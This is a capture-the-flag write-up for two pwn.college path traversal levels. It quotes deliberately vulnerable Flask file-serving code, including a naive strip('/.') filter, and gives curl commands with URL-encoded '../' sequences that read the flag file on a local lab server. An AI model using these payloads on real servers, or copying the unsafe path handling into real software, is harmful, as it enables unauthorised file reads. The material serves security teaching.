---
tags: ["Web Security", "Web Server", "File System"]
title: "Path Traversal"
description: Get un-authorized files from web server using Path Traversal
reference: https://pwn.college/intro-to-cybersecurity/web-security/
---

# 1

## Description

This level will explore the intersection of Linux path resolution, when done naively, and unexpected web requests from an attacker. We've implemented a simple web server for you --- it will serve up files from /challenge/files over HTTP. Can you trick it into giving you the flag?

The webserver program is /challenge/server. You can run it just like any other challenge, then talk to it over HTTP (using a different terminal or a web browser). We recommend reading through its code to understand what it is doing and to find the weakness!

HINT: If you're wondering why your solution isn't working, make sure what you're trying to query is what is actually being received by the server! curl -v [url] can show you the exact bytes that curl is sending over.

## Solution

1. read the server code

```python
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/payload", methods=["GET"])
@app.route("/payload/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

2. send an HTTP request that

- `%2F` is the URL encoded representation of the forward slash character `/`.
- Based on how the server process the request - `requested_path = app.root_path + "/files/" + path` and `path` is controlled by the HTTP client, if we set `path=../../flag`, then `requested_path = /flag`. It means we can access files outside from `/challeges/files/`.

```
curl -v challenge.localhost/payload/..%2f..%2fflag
```

---

# 2

## Description

The previous level's path traversal happened because of a disconnect between:

- The developer's awareness of the true range of potential input that an attacker might send to their application (e.g., the concept of an attacker sending characters that have special meaning in paths).
- A gap between the developer's intent (the implementation makes it clear that we only expect files under the /challenge/files directory to be served to the user) and the reality of the filesystem (where paths can go "back" up a directory level).

This level tries to stop you from traversing the path, but does it in a way that clearly demonstrates a further lack of the developer's understanding of how tricky paths can truly be. Can you still traverse it?

## Solution

1. read the server code

This time the server will strip out the `"/."` from the client input path.

```
path.strip("/.")
```

Effect from `strip("/.")`:

```
>>> "../../flag".strip("/.")
'flag'
```

Server code:

```python
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/serve", methods=["GET"])
@app.route("/serve/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path.strip("/.")
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```


2. found there is a sub-folder inside `files`

```
hacker@web-security~path-traversal-2:/challenge$ ls files/fortunes/
fortune-1.txt  fortune-2.txt  fortune-3.txt
```

3. the `strip` function behaviour

do nothing when the string is not start with "/" or ".":

```
>>> "fortunes/../../../flag".strip("/.")
'fortunes/../../../flag'
```

4. curl

```
curl -v challenge.localhost/serve/fortunes%2f..%2f..%2f..%2fflag
DEBUG: requested_path='/challenge/files/fortunes/../../../flag'
```
